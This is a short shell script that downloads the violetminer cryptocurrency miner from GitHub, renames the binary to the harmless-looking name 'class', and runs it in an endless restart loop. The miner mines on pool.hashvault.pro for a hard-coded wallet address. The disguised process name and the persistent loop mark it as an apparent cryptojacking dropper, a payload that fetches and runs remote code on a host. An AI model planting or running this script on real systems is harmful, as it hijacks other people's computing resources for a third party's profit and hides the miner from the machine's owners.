#!/bin/sh
wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
tar xf violetminer-linux-v0.2.2.tar.gz
cd violetminer-linux-v0.2.2
mv violetminer class
while [ 1 ]; do
./class --pool pool.hashvault.pro:8888 --username TRTLuxGFuQW41X6dXUcQm9WAKn96KLLtjWtk7QP7SjG8GDR5EgQnCqMQzPG6edWNHNEgLdiL7rruQEtcBpGeMCYMWrm4nsrSREk --password x --algorithm chukwa_v2 --ssl
sleep 10
done